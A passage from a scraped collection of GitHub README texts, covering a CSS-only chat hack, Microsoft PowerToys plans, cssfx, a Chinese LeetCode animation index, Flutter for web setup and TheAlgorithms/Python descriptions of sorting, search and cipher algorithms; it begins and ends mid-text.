we load up a <style> element that display: none's all the previous html\nThen we load up whatever new html we want to show\nFinally we wait until the next update we want to send and GOTO 3.\n\nSingle-use buttons?\nOk, so we have that problem earlier where each button is only single-use.  It tries to send a get request once, then never will again.\nThankfully, our method of receiving data fixes that for us.  Here's what happens:\n\nWe show an \"a\" button whose background image is like \"img/a\".\nWhen you press it, the server receives the image request for \"a\"\nThe server then pushes an update to the client to hide the current button and replace it with one whose background images is \"image/aa\".\n\nIf the buttons you pressed were \"h\", \"e\", and \"l\", then the \"a\" button's background image url would be \"img/hela\".  And since we're replacing all buttons every time you press one, the single-use button problem goes away!\nMisc other details\n\nWe actually encode a bit more info into the button urls (like each client's id)\nBecause the data-sending and data-receiving happens on different threads, we need inter-thread communication.  That sounds like work, so we'll just use Redis pubsub for that.\n\nFAQ\nWhat inspired this? Chernobyl, Hindenburg, The Tacoma Narrows Bridge...\nReally? No, it was this clever tweet by davywtf.\nWhy's your code suck Why do you suck?\nNo but really Because I was mostly making this up as I went.  There's a lot of exploratory coding here that I only minimally cleaned up.  If I rebuilt it I'd store the UI state for a client in redis and just push it out in its entirety when needed via a single generic screen-updating mechanism.\nWhat could go wrong with this technique? Broken by browser bg-image handling changes; long-request timeouts; running out of threads; fast-clicking bugs; generic concurrency headaches; poor handling by proxies; it's crazy inaccessible; etc etc\nShould I use this in real life? Dear god yes.\nI have an idea for how this could be made better/worse/hackier Tweet at me (@kkuchta).  I'm always down to see a terrible idea taken further!\nPractical Details\nIf you want to install and use this locally you should:\n\nRe-evaluate your life choices\nIf you simply must continue, check out INSTALL.md\n\nIf you want to contribute, see number 1 above.  After that, just fork this repo, make a change, and then open a PR against this repo."}, {"title": "microsoft/PowerToys", "language": "Ruby", "content": "Overview\nPowerToys is a set of utilities for power users to tune and streamline their Windows experience for greater productivity.\nInspired by the Windows 95 era PowerToys project, this reboot provides power users with ways to squeeze more efficiency out of the Windows 10 shell and customize it for individual workflows.  A great overview of the Windows 95 PowerToys can be found here.\nThe first preview of these utilities and corresponding source code will be released Summer 2019.\n\nWhat's Happening\nThe first two utilities we're working on are:\n\nMaximize to new desktop widget - The MTND widget shows a pop-up button when a user hovers over the maximize / restore button on any window.  Clicking it creates a new desktop, sends the app to that desktop and maximizes the app on the new desktop.\n\n\n\nWindows key shortcut guide - The shortcut guide appears when a user holds the Windows key down for more than one second and shows the available shortcuts for the current state of the desktop.\n\n\nBacklog\nHere's the current set of utilities we're considering.  Please use issues and +1's to guide the project to suggest new ideas and help us prioritize the list below.\n\nFull window manager including specific layouts for docking and undocking laptops\nKeyboard shortcut manager\nWin+R replacement\nBetter Alt+Tab including browser tab integration and search for running apps\nBattery tracker\nBatch file re-namer\nQuick resolution swaps in taskbar\nMouse events without focus\nCmd (or PS or Bash) from here\nContents menu file browsing\n\nContributing\nThis project welcomes contributions and suggestions.  Most contributions require you to agree to a\nContributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us\nthe rights to use your contribution. For details, visit https://cla.microsoft.com.\nWhen you submit a pull request, a CLA-bot will automatically determine whether you need to provide\na CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions\nprovided by the bot. You will only need to do this once across all repos using our CLA.\nThis project has adopted the Microsoft Open Source Code of Conduct.\nFor more information see the Code of Conduct FAQ or\ncontact opencode@microsoft.com with any additional questions or comments."}, {"title": "jolaleye/cssfx", "language": "Vue", "content": "Beautifully simple click-to-copy CSS effects\n\n\nhttps://cssfx.dev\n\nTo run locally, npm install then npm run dev.\nContributing\nCheck out the contributing guide to learn how you can help out!\nAlways be sure to follow the Code of Conduct.\nLicense\nThe CSSFX site and effects are MIT licensed."}, {"title": "MisterBooo/LeetCodeAnimation", "language": "Java", "content": "There is an English version of README here. just click it\uff01\n\u6211\u4f1a\u5c3d\u529b\u5c06 LeetCode \u4e0a\u6240\u6709\u7684\u9898\u76ee\u90fd\u7528\u52a8\u753b\u7684\u5f62\u5f0f\u6f14\u793a\u51fa\u6765\uff0c\u8ba1\u5212\u7528 3 \u5230 4 \u5e74\u65f6\u95f4\u53bb\u5b8c\u6210\u5b83\uff0c\u671f\u5f85\u4e0e\u4f60\u89c1\u8bc1\u8fd9\u4e00\u5929\uff01\n\u6587\u7ae0\u6700\u65b0\u9996\u53d1\u4e8e\u5fae\u4fe1\u516c\u4f17\u53f7 \u4e94\u5206\u949f\u5b66\u7b97\u6cd5 \uff0c\u60a8\u53ef\u4ee5\u5173\u6ce8\u83b7\u53d6\u6700\u65b0\u7684\u6587\u7ae0\u3002\n\u6c47\u603b\n\n\n\n\u5e8f\u53f7\n\u9898\u76ee&\u9898\u89e3\n\n\n\n\n0\n\u5341\u5927\u7ecf\u5178\u6392\u5e8f\u7b97\u6cd5\u52a8\u753b\u4e0e\u89e3\u6790\uff0c\u770b\u6211\u5c31\u591f\u4e86\uff01\uff08\u914d\u4ee3\u7801\u5b8c\u5168\u7248\uff09\n\n\n1\n\u4e24\u6570\u4e4b\u548c\n\n\n2\n\u4e24\u6570\u76f8\u52a0\n\n\n3\n\u65e0\u91cd\u590d\u5b57\u7b26\u7684\u6700\u957f\u5b50\u4e32\n\n\n15\n\u4e09\u6570\u4e4b\u548c\n\n\n19\n\u5220\u9664\u94fe\u8868\u7684\u5012\u6570\u7b2c N \u4e2a\u8282\u70b9\n\n\n20\n\u6709\u6548\u7684\u62ec\u53f7\n\n\n21\n\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u94fe\u8868\n\n\n23\n\u5408\u5e76 K \u4e2a\u6392\u5e8f\u94fe\u8868\n\n\n24\n\u4e24\u4e24\u4ea4\u6362\u94fe\u8868\u4e2d\u7684\u8282\u70b9\n\n\n26\n\u5220\u9664\u6392\u5e8f\u6570\u7ec4\u4e2d\u7684\u91cd\u590d\u9879\n\n\n75\n\u989c\u8272\u5206\u7c7b\n\n\n86\n\u5206\u5272\u94fe\u8868\n\n\n92\n\u53cd\u8f6c\u94fe\u8868 II\n\n\n94\n\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u904d\u5386\n\n\n101\n\u5bf9\u79f0\u4e8c\u53c9\u6811\n\n\n102\n\u4e8c\u53c9\u6811\u7684\u5c42\u5e8f\u904d\u5386\n\n\n103\n\u4e8c\u53c9\u6811\u7684\u952f\u9f7f\u5f62\u5c42\u6b21\u904d\u5386\n\n\n107\n\u4e8c\u53c9\u6811\u7684\u5c42\u6b21\u904d\u5386 II\n\n\n118\n\u6768\u8f89\u4e09\u89d2\n\n\n119\n\u6768\u8f89\u4e09\u89d2II\n\n\n110\n\u5e73\u8861\u4e8c\u53c9\u6811\n\n\n121\n\u4e70\u5356\u80a1\u7968\u7684\u6700\u4f73\u65f6\u673a\n\n\n122\n\u4e70\u5356\u80a1\u7968\u7684\u6700\u4f73\u65f6\u673aII\n\n\n123\n\u4e70\u5356\u80a1\u7968\u7684\u6700\u4f73\u65f6\u673aIII\n\n\n125\n\u9a8c\u8bc1\u56de\u6587\u4e32\n\n\n131\n\u5206\u5272\u56de\u6587\u4e32\n\n\n136\n\u53ea\u51fa\u73b0\u4e00\u6b21\u7684\u6570\u5b57\n\n\n138\n\u590d\u5236\u5e26\u968f\u673a\u6307\u9488\n\n\n139\n\u5355\u8bcd\u62c6\u5206\n\n\n144\n\u4e8c\u53c9\u6811\u7684\u524d\u5e8f\u904d\u5386\n\n\n145\n\u4e8c\u53c9\u6811\u7684\u540e\u5e8f\u904d\u5386\n\n\n146\nLRU\u7f13\u5b58\u673a\u5236\n\n\n150\n\u9006\u6ce2\u5170\u8868\u8fbe\u5f0f\u6c42\u503c\n\n\n167\n\u4e24\u6570\u4e4b\u548c II - \u8f93\u5165\u6709\u5e8f\u6570\u7ec4\n\n\n172\n\u9636\u4e58\u540e\u7684\u96f6\n\n\n187\n\u91cd\u590d\u7684 DNA \u5e8f\u5217\n\n\n199\n\u4e8c\u53c9\u6811\u7684\u53f3\u89c6\u56fe\n\n\n203\n\u79fb\u9664\u94fe\u8868\u5143\u7d20\n\n\n206\n\u53cd\u8f6c\u94fe\u8868\n\n\n209\n\u957f\u5ea6\u6700\u5c0f\u7684\u5b50\u6570\u7ec4\n\n\n219\n\u5b58\u5728\u91cd\u590d\u5143\u7d20 II\n\n\n237\n\u5220\u9664\u94fe\u8868\u4e2d\u7684\u8282\u70b9\n\n\n239\n\u6ed1\u52a8\u7a97\u53e3\u6700\u5927\u503c\n\n\n279\n\u5b8c\u5168\u5e73\u65b9\u6570\n\n\n283\n\u79fb\u52a8\u96f6\n\n\n295\n\u6570\u636e\u6d41\u7684\u4e2d\u4f4d\u6570\n\n\n301\n\u5220\u9664\u65e0\u6548\u7684\u62ec\u53f7\n\n\n326\n3 \u7684\u5e42\n\n\n328\n\u5947\u5076\u94fe\u8868\n\n\n344\n\u53cd\u8f6c\u5b57\u7b26\u4e32\n\n\n349\n\u4e24\u4e2a\u6570\u7ec4\u7684\u4ea4\u96c6\n\n\n350\n\u4e24\u4e2a\u6570\u7ec4\u7684\u4ea4\u96c6 II\n\n\n445\n\u4e24\u6570\u76f8\u52a0 II\n\n\n447\n\u56de\u65cb\u9556\u7684\u6570\u91cf\n\n\n454\n\u56db\u6570\u76f8\u52a0 II\n\n\n642\n\u8bbe\u8ba1\u4e00\u4e2a\u641c\u7d22\u81ea\u52a8\u5b8c\u6210\u7cfb\u7edf\n\n\n690\n\u5458\u5de5\u7684\u91cd\u8981\u6027\n\n\n877\n\u77f3\u5b50\u6e38\u620f\n\n\n\n\u8865\u5145\n\u8be5\u4ed3\u5e93\u4fdd\u6301\u968f\u65f6\u66f4\u65b0\u3002\n2018-12-29 \u8bf4\u660e\uff1a\n\u300a2019\u5e74LeetCodeAnimationd\u7684\u66f4\u65b0\u8ba1\u5212\u300b\n2018-12-07 \u8bf4\u660e\uff1a\n\u4e3a\u4e86\u66f4\u597d\u7684\u505a\u597dLeetCode\u52a8\u753b\uff0c\u7b14\u8005\u6b63\u5728\u52aa\u529b\u7684\u5b66\u4e60\u66f4\u591a\u7684\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u3002\n\u7b14\u8005\u76ee\u524d\u6b63\u5728\u5199\u6570\u636e\u7ed3\u6784\u7684\u6587\u7ae0\u4e0e\u52a8\u753b\uff0c\u5c06\u300a\u52a8\u753b\u56fe\u89e3\u6570\u636e\u7ed3\u6784\u300b\u7cfb\u5217\u6587\u7ae0\u5199\u5b8c\u540e\u5c06\u7ee7\u7eed\u66f4\u65b0\u6b64\u4ed3\u5e93\u3002\n\u90ae\u7bb1\uff1amisterbigbooo@gmail.com\n\u559c\u6b22\u5c31star\u2764\ufe0f\u4e00\u4e0b\u5427\uff01\n\u548c\u6211\u4ea4\u6d41\n\n\n\n\u4e8c\u7ef4\u7801\n\u8bf4\u660e\n\n\n\n\n\n\u6b22\u8fce\u524d\u6765\u548c\u7a0b\u5e8f\u5458\u5c0f\u5434\u4e00\u8d77\u5b66\u7b97\u6cd5"}, {"title": "flutter/flutter_web", "language": "Dart", "content": "Welcome to the code repository for Flutter for web.\nThis repository contains the source code for a fork of\nFlutter that targets the web. Our goal is to add web\nsupport as a first-tier platform in the Flutter SDK alongside iOS and Android.\nThe code in this repository is a stepping stone to that goal,\nproviding web-only packages that implement (almost) the entire Flutter API.\nWeb support for Flutter is not yet stable. We're designating this release as a\ntechnical preview, designed to validate that the product\nmeets developers' needs, iterate on major features and get to feature complete.\nDesign and implementation may change significantly, and changes may be\nintroduced that break compatibility with existing code. As a result, the Flutter\nteam do not recommend using code created with Flutter for web in production\nat this time.\nYou can find a\nshort introduction to Flutter for web\non our blog.\nImportant notes\nLimitations\nWe intend to completely support all of Flutter's API and functionality across\nmodern browsers. However, during this preview, there are a number of exceptions:\n\nflutter_web does not have a plugin system yet. Temporarily, we provide\naccess to dart:html, dart:js, dart:svg, dart:indexed_db and other web\nlibraries that give you access to the vast majority of browser APIs. However,\nexpect that these libraries will be replaced by a different plugin API.\nNot all Flutter APIs are implemented on Flutter for web yet.\nPerformance work is only just beginning. The code generated by Flutter for web\nmay run slowly, or demonstrate significant UI \"jank\".\nAt this time, desktop UI interactions are not fully complete, so a UI built\nwith flutter_web may feel like a mobile app, even\nwhen running on a desktop browser.\nThe development workflow is only designed to work with Chrome at the moment.\n\nBrowser support\nFlutter for web provides:\n\na production JavaScript compiler\nthat generates optimized, minified code for deployment\na development JavaScript compiler,\nthat offers incremental compilation and hot restart\n\nWhen built with the production compiler, Flutter supports Chromium-based\nbrowsers and Safari, both on desktop and mobile. We also aim to fully support\nFirefox and Edge as targeted platforms, but our own test coverage is still low\non these browsers. Our intention is to support the current and the last two\nmajor releases. Feedback on rendering and performance issues on all of these\nbrowsers is appreciated.\nInternet Explorer support is not planned.\nThe development compiler currently supports Chrome only.\nTesting Flutter for web\nWhile we are far from code complete, we're ready for you to start developing\nand experimenting with Flutter for web. We are building the product around a\nnumber of target scenarios,\nas described in our blog,\nand we'd appreciate your feedback on feature gaps or suitability for these\nscenarios, as well as other scenarios for which you find Flutter useful on the\nweb.\nIn addition, we'd love to see repros that demonstrate crashes, rendering\nfidelity issues or extreme performance issues. We'd also love general feedback\non the quality of the release and the developer experience.\nOf particular interest to us is testing across a variety of operating systems\nused for development (Windows, Linux, Mac) and browsers used for deployment.\nSince we are developing this in a separate fork to the main Flutter repo, we are\nnot yet ready to accept GitHub pull requests at this time. However,\nGitHub issues are very welcome.\nSamples\nCheck out flutter.github.io/samples.\nGetting started\nFlutter 1.5 and above enable support for targeting the web with Flutter,\nincluding Dart compilation to JavaScript. To use the Flutter SDK with the\nflutter_web preview make sure you have upgraded Flutter to at least v1.5.4\nby running flutter upgrade from your machine. If you're actively developing\nfor Flutter for web, you may prefer to be running from one of the unstable\nchannels. Our wiki describes the\nFlutter channels\nand how to select the right one for your needs.\nClone the flutter_web source code\nClone this repository locally.\nInstall the flutter_web build tools\nTo install the\nwebdev package,\nwhich provides the build tools for Flutter for web, run the following:\n$ flutter packages pub global activate webdev\nEnsure that the $HOME/.pub-cache/bin directory\nis in your path,\nand then you may use the webdev command directly from your terminal.\n\nNote: if you have problems configuring webdev to run directly, try:\nflutter packages pub global run webdev [command].\n\nRun the hello_world example\n\n\nThe example exists at examples/hello_world in the repository.\n$ cd examples/hello_world/\n\n\nUpdate packages.\n$ flutter packages upgrade\n! flutter_web 0.0.0 from path ../../flutter_web\n! flutter_web_ui 0.0.0 from path ../../flutter_web_ui\nRunning \"flutter packages upgrade\" in hello_world...                5.0s\nIf that succeeds, you're ready to run it!\n\n\nBuild and serve the example locally.\n$ webdev serve\n[INFO] Generating build script completed, took 331ms\n...\n[INFO] Building new asset graph completed, took 1.4s\n...\n[INFO] Running build completed, took 27.9s\n...\n[INFO] Succeeded after 28.1s with 618 outputs (3233 actions)\nServing `web` on http://localhost:8080\nOpen http://localhost:8080 in Chrome and you should see Hello World in\nred text in the upper-left corner.\n\n\nTools support for Flutter web development\nVisual Studio Code\nVisual Studio Code supports Flutter web development with the v3.0 release of\nthe Flutter extension.\n\ninstall the Flutter SDK\nset up VS Code\nconfigure VS Code to point to your local Flutter SDK\nrun the Flutter: New Web Project command from VS Code\nafter the project is created, run your app by pressing F5 or\n\"Debug -> Start Debugging\"\nVS Code will use the webdev command-line tool to build and run your app; a\nnew Chrome window should open, showing your running app\n\nUsing from IntelliJ\n\ninstall the Flutter SDK\nset up your copy of IntelliJ or\nAndroid Studio\nconfigure IntelliJ or Android Studio to point to your local Flutter SDK\ncreate a new Dart project; note, for a Flutter for web app, you want to start\nfrom the Dart project wizard, not the Flutter project wizard\nfrom the Dart project wizard, select the 'Flutter for web' option for the\napplication template\ncreate the project; pub get will be run automatically\nonce the project is created, hit the run button on the main toolbar\nIntelliJ will use the webdev command-line tool to build and run your app; a\nnew Chrome window should open, showing your running app\n\nWorkflow\nUse flutter_web packages from git\nIf you'd like to depend on the flutter_web packages without cloning the\nrepository, you can setup your pubspec as follows:\nname: my_flutter_web_app\n\nenvironment:\n  sdk: '>=2.2.0 <3.0.0'\n\ndependencies:\n  flutter_web: any\n  flutter_web_ui: any\n\ndev_dependencies:\n  # Enables the `pub run build_runner` command\n  build_runner: ^1.1.2\n  # Includes the JavaScript compilers\n  build_web_compilers: ^1.0.0\n\n# flutter_web packages are not published to pub.dartlang.org\n# These overrides tell the package tools to get them from GitHub\ndependency_overrides:\n  flutter_web:\n    git:\n      url: https://github.com/flutter/flutter_web\n      path: packages/flutter_web\n  flutter_web_ui:\n    git:\n      url: https://github.com/flutter/flutter_web\n      path: packages/flutter_web_ui\nGetting (stateless) hot-reload with webdev\nTo use webdev with hot-reload, run the following within your project\ndirectory:\n$ webdev serve --auto restart\nYou'll notice a similar output to flutter packages pub run build_runner serve\nbut now changes to your application code should cause a quick refresh of the\napplication on save.\n\nNote: the --hot-reload option is not perfect. If you notice unexpected\nbehavior, you may want to manually refresh the page.\n\n\nNote: the --hot-reload option is currently \"stateless\". Application state\nwill be lost on reload. We do hope to offer \"stateful\" hot-reload on the web\n\u2013 we're actively working on it!\n\nBuilding with the production JavaScript compiler\nThe workflow documented above (available with build_runner and webdev) uses\nthe Dart Dev Compiler which is\ndesigned for fast, incremental compilation and easy debugging.\nIf you'd like evaluate production performance, browser compatibility and code\nsize, you can enable our release compiler,\ndart2js.\nTo enable the release compiler, pass in the --release flag (or just -r).\n$ webdev serve -r\n\nNote: Builds may be slower in this configuration.\n\nIf you'd like to generate output to disk, we recommend you use webdev.\n$ webdev build\nThis will create a build directory with index.html, main.dart.js and the\nrest of the files needed to run the application using a static HTTP server.\nTo optimize the output JavaScript, you can enable optimization flags using a\nbuild.yaml file in the root of your project with the following contents:\n# See https://github.com/dart-lang/build/tree/master/build_web_compilers#configuration\ntargets:\n  $default:\n    builders:\n      build_web_compilers|entrypoint:\n        generate_for:\n        - web/**.dart\n        options:\n          dart2js_args:\n            - --no-source-maps\n            - -O4\n\nNote: the -O4 option enables a number of advanced optimizations that may\ncause runtime errors in code that has not been thoroughly tested.\n\nMigrating existing code\nIf you'd like to migrate existing Flutter code to run on the web preview, read\nthe migration guide."}, {"title": "TheAlgorithms/Python", "language": "Python", "content": "The Algorithms - Python \n\nAll algorithms implemented in Python (for education)\nThese implementations are for demonstration purposes. They are less efficient than the implementations in the Python standard library.\nSorting Algorithms\nBubble Sort\n\nBubble sort, sometimes referred to as sinking sort, is a simple sorting algorithm that repeatedly steps through the list to be sorted, compares each pair of adjacent items and swaps them if they are in the wrong order. The pass through the list is repeated until no swaps are needed, which indicates that the list is sorted.\nProperties\n\nWorst case performance\tO(n2)\nBest case performance\tO(n)\nAverage case performance\tO(n2)\n\nSource: Wikipedia\nView the algorithm in action\nBucket\n\n\nBucket sort, or bin sort, is a sorting algorithm that works by distributing the elements of an array into a number of buckets. Each bucket is then sorted individually, either using a different sorting algorithm, or by recursively applying the bucket sorting algorithm.\nProperties\n\nWorst case performance\tO(n2)\nBest case performance\tO(n+k)\nAverage case performance\tO(n+k)\n\nSource: Wikipedia\nCocktail shaker\n\nCocktail shaker sort, also known as bidirectional bubble sort, cocktail sort, shaker sort (which can also refer to a variant of selection sort), ripple sort, shuffle sort, or shuttle sort, is a variation of bubble sort that is both a stable sorting algorithm and a comparison sort. The algorithm differs from a bubble sort in that it sorts in both directions on each pass through the list.\nProperties\n\nWorst case performance\tO(n2)\nBest case performance\tO(n)\nAverage case performance\tO(n2)\n\nSource: Wikipedia\nInsertion Sort\n\nInsertion sort is a simple sorting algorithm that builds the final sorted array (or list) one item at a time. It is much less efficient on large lists than more advanced algorithms such as quicksort, heapsort, or merge sort.\nProperties\n\nWorst case performance\tO(n2)\nBest case performance\tO(n)\nAverage case performance\tO(n2)\n\nSource: Wikipedia\nView the algorithm in action\nMerge Sort\n\nMerge sort (also commonly spelled mergesort) is an efficient, general-purpose, comparison-based sorting algorithm. Most implementations produce a stable sort, which means that the implementation preserves the input order of equal elements in the sorted output. Mergesort is a divide and conquer algorithm that was invented by John von Neumann in 1945.\nProperties\n\nWorst case performance\tO(n log n)\nBest case performance\tO(n log n)\nAverage case performance\tO(n log n)\n\nSource: Wikipedia\nView the algorithm in action\nQuick\n\nQuicksort (sometimes called partition-exchange sort) is an efficient sorting algorithm, serving as a systematic method for placing the elements of an array in order.\nProperties\n\nWorst case performance\tO(n2)\nBest case performance\tO(n log n) or O(n) with three-way partition\nAverage case performance\tO(n log n)\n\nSource: Wikipedia\nView the algorithm in action\nHeap\n\nHeapsort is a comparison-based sorting algorithm. It can be thought of as an improved selection sort. It divides its input into a sorted and an unsorted region, and it iteratively shrinks the unsorted region by extracting the largest element and moving that to the sorted region.\nProperties\n\nWorst case performance\tO(n log n)\nBest case performance\tO(n log n)\nAverage case performance\tO(n log n)\n\nSource: Wikipedia\nView the algorithm in action\nRadix\nFrom Wikipedia: Radix sort is a non-comparative integer sorting algorithm that sorts data with integer keys by grouping keys by the individual digits which share the same significant position and value.\nProperties\n\nWorst case performance\tO(wn)\nBest case performance\tO(wn)\nAverage case performance\tO(wn)\n\nSource: Wikipedia\nSelection\n\nSelection sort is an algorithm that divides the input list into two parts: the sublist of items already sorted, which is built up from left to right at the front (left) of the list, and the sublist of items remaining to be sorted that occupy the rest of the list. Initially, the sorted sublist is empty and the unsorted sublist is the entire input list. The algorithm proceeds by finding the smallest (or largest, depending on sorting order) element in the unsorted sublist, exchanging (swapping) it with the leftmost unsorted element (putting it in sorted order), and moving the sublist boundaries one element to the right.\nProperties\n\nWorst case performance\tO(n2)\nBest case performance\tO(n2)\nAverage case performance\tO(n2)\n\nSource: Wikipedia\nView the algorithm in action\nShell\n\nShellsort is a generalization of insertion sort that allows the exchange of items that are far apart.  The idea is to arrange the list of elements so that, starting anywhere, considering every nth element gives a sorted list.  Such a list is said to be h-sorted.  Equivalently, it can be thought of as h interleaved lists, each individually sorted.\nProperties\n\nWorst case performance O(nlog2n)\nBest case performance O(n log n)\nAverage case performance depends on gap sequence\n\nSource: Wikipedia\nView the algorithm in action\nTopological\nFrom Wikipedia: Topological sort, or topological ordering of a directed graph is a linear ordering of its vertices such that for every directed edge uv from vertex u to vertex v, u comes before v in the ordering. For instance, the vertices of the graph may represent tasks to be performed, and the edges may represent constraints that one task must be performed before another; in this application, a topological ordering is just a valid sequence for the tasks. A topological ordering is possible if and only if the graph has no directed cycles, that is, if it is a directed acyclic graph (DAG). Any DAG has at least one topological ordering, and algorithms are known for constructing a topological ordering of any DAG in linear time.\nTime-Complexity Graphs\nComparing the complexity of sorting algorithms (Bubble Sort, Insertion Sort, Selection Sort)\n\nComparing the sorting algorithms:\n  -Quicksort is a very fast algorithm but can be pretty tricky to implement\n  -Bubble sort is a slow algorithm but is very easy to implement. To sort small sets of data, bubble sort may be a better option since it can be implemented quickly, but for larger datasets, the speedup from quicksort might be worth the trouble implementing the algorithm.\n\nSearch Algorithms\nLinear\n\nLinear search or sequential search is a method for finding a target value within a list. It sequentially checks each element of the list for the target value until a match is found or until all the elements have been searched. Linear search runs in at worst linear time and makes at most n comparisons, where n is the length of the list.\nProperties\n\nWorst case performance\tO(n)\nBest case performance\tO(1)\nAverage case performance\tO(n)\nWorst case space complexity\tO(1) iterative\n\nSource: Wikipedia\nBinary\n\nBinary search, also known as half-interval search or logarithmic search, is a search algorithm that finds the position of a target value within a sorted array. It compares the target value to the middle element of the array; if they are unequal, the half in which the target cannot lie is eliminated and the search continues on the remaining half until it is successful.\nProperties\n\nWorst case performance\tO(log n)\nBest case performance\tO(1)\nAverage case performance\tO(log n)\nWorst case space complexity\tO(1)\n\nSource: Wikipedia\nInterpolation\nInterpolation search is an algorithm for searching for a key in an array that has been ordered by numerical values assigned to the keys (key values). It was first described by W. W. Peterson in 1957. Interpolation search resembles the method by which people search a telephone directory for a name (the key value by which the book's entries are ordered): in each step the algorithm calculates where in the remaining search space the sought item might be, based on the key values at the bounds of the search space and the value of the sought key, usually via a linear interpolation. The key value actually found at this estimated position is then compared to the key value being sought. If it is not equal, then depending on the comparison, the remaining search space is reduced to the part before or after the estimated position. This method will only work if calculations on the size of differences between key values are sensible.\nBy comparison, binary search always chooses the middle of the remaining search space, discarding one half or the other, depending on the comparison between the key found at the estimated position and the key sought \u2014 it does not require numerical values for the keys, just a total order on them. The remaining search space is reduced to the part before or after the estimated position. The linear search uses equality only as it compares elements one-by-one from the start, ignoring any sorting.\nOn average the interpolation search makes about log(log(n)) comparisons (if the elements are uniformly distributed), where n is the number of elements to be searched. In the worst case (for instance where the numerical values of the keys increase exponentially) it can make up to O(n) comparisons.\nIn interpolation-sequential search, interpolation is used to find an item near the one being searched for, then linear search is used to find the exact item.\nSource: Wikipedia\nJump Search\nJump search or block search refers to a search algorithm for ordered lists. It works by first checking all items Lkm, where {\\displaystyle k\\in \\mathbb {N} } k\\in \\mathbb {N}  and m is the block size, until an item is found that is larger than the search key. To find the exact position of the search key in the list a linear search is performed on the sublist L[(k-1)m, km].\nThe optimal value of m is \u221an, where n is the length of the list L. Because both steps of the algorithm look at, at most, \u221an items the algorithm runs in O(\u221an) time. This is better than a linear search, but worse than a binary search. The advantage over the latter is that a jump search only needs to jump backwards once, while a binary can jump backwards up to log n times. This can be important if a jumping backwards takes significantly more time than jumping forward.\nThe algorithm can be modified by performing multiple levels of jump search on the sublists, before finally performing the linear search. For an k-level jump search the optimum block size ml for the lth level (counting from 1) is n(k-l)/k. The modified algorithm will perform k backward jumps and runs in O(kn1/(k+1)) time.\nSource: Wikipedia\nQuick Select\n\nQuick Select is a selection algorithm to find the kth smallest element in an unordered list. It is related to the quicksort sorting algorithm. Like quicksort, it was developed by Tony Hoare, and thus is also known as Hoare's selection algorithm.[1] Like quicksort, it is efficient in practice and has good average-case performance, but has poor worst-case performance. Quickselect and its variants are the selection algorithms most often used in efficient real-world implementations.\nQuickselect uses the same overall approach as quicksort, choosing one element as a pivot and partitioning the data in two based on the pivot, accordingly as less than or greater than the pivot. However, instead of recursing into both sides, as in quicksort, quickselect only recurses into one side \u2013 the side with the element it is searching for. This reduces the average complexity from O(n log n) to O(n), with a worst case of O(n2).\nAs with quicksort, quickselect is generally implemented as an in-place algorithm, and beyond selecting the k'th element, it also partially sorts the data. See selection algorithm for further discussion of the connection with sorting.\nSource: Wikipedia\nTabu\nTabu search uses a local or neighborhood search procedure to iteratively move from one potential solution {\\displaystyle x} x to an improved solution {\\displaystyle x'} x' in the neighborhood of {\\displaystyle x} x, until some stopping criterion has been satisfied (generally, an attempt limit or a score threshold). Local search procedures often become stuck in poor-scoring areas or areas where scores plateau. In order to avoid these pitfalls and explore regions of the search space that would be left unexplored by other local search procedures, tabu search carefully explores the neighborhood of each solution as the search progresses. The solutions admitted to the new neighborhood, {\\displaystyle N^{}(x)} N^(x), are determined through the use of memory structures. Using these memory structures, the search progresses by iteratively moving from the current solution {\\displaystyle x} x to an improved solution {\\displaystyle x'} x' in {\\displaystyle N^{}(x)} N^(x).\nThese memory structures form what is known as the tabu list, a set of rules and banned solutions used to filter which solutions will be admitted to the neighborhood {\\displaystyle N^{}(x)} N^(x) to be explored by the search. In its simplest form, a tabu list is a short-term set of the solutions that have been visited in the recent past (less than {\\displaystyle n} n iterations ago, where {\\displaystyle n} n is the number of previous solutions to be stored \u2014 is also called the tabu tenure). More commonly, a tabu list consists of solutions that have changed by the process of moving from one solution to another. It is convenient, for ease of description, to understand a \u201csolution\u201d to be coded and represented by such attributes.\nSource: Wikipedia\n\nCiphers\nCaesar\n![alt text][caesar]\nCaesar cipher, also known as Caesar's cipher, the shift cipher, Caesar's code or Caesar shift, is one of the simplest and most widely known encryption techniques.\nIt is a type of substitution cipher in which each letter in the plaintext is replaced by a letter some fixed number of positions down the alphabet. For example, with a left shift of 3, D would be replaced by A, E would become B, and so on. \nThe method is named after Julius Caesar, who used it in his private correspondence.\nThe encryption step performed by a Caesar cipher is often incorporated as part of more complex schemes, such as the Vigen\u00e8re cipher, and still has modern application in the ROT13 system. As with all single-alphabet substitution ciphers, the Caesar cipher is easily broken and in modern practice offers essentially no communication security.\nSource: Wikipedia\nVigen\u00e8re\nVigen\u00e8re cipher is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers based on the letters of a keyword. It is a form of polyalphabetic substitution.\nThe Vigen\u00e8re cipher has been reinvented many times. The method was originally described by Giovan Battista Bellaso in his 1553 book La cifra del. Sig. Giovan Battista Bellaso; however, the scheme was later misattributed to Blaise de Vigen\u00e8re in the 19th century, and is now widely known as the \"Vigen\u00e8re cipher\".\nThough the cipher is easy to understand and implement, for three centuries it resisted all attempts to break it; this earned it the description le chiffre ind\u00e9chiffrable(French for 'the indecipherable cipher').\nMany people have tried to implement encryption schemes that are essentially Vigen\u00e8re ciphers. Friedrich Kasiski was the first to publish a general method of deciphering a Vigen\u00e8re cipher in 1863.\nSource: Wikipedia\nTransposition\nTransposition cipher is a method of encryption by which the positions held by units of plaintext (which are commonly characters or groups of characters) are shifted according to a regular system, so that the ciphertext constitutes a permutation of the plaintext. That is, the order of the units is changed (the plaintext is reordered).\nMathematically a bijective function is used on the characters' positions to encrypt and an inverse function to decrypt.\nSource: Wikipedia\nRSA (Rivest\u2013Shamir\u2013Adleman)\nRSA (Rivest\u2013Shamir\u2013Adleman) is one of the first public-key cryptosystems and is widely used for secure data transmission. In such a cryptosystem, the encryption key is public and it is different from the decryption key which is kept secret (private). In RSA, this asymmetry is based on the practical difficulty of the factorization of the product of two large prime numbers, the \"factoring problem\". The acronym RSA is made of the initial letters of the surnames of Ron Rivest, Adi Shamir, and Leonard Adleman, who first publicly described the algorithm in 1978. Clifford Cocks, an English mathematician working for the British intelligence agency Government Communications Headquarters (GCHQ), had developed an equivalent system in 1973, but this was not declassified until 1997.[1]\nA user of RSA creates and then publishes a public key based on two large prime numbers, along with an auxiliary 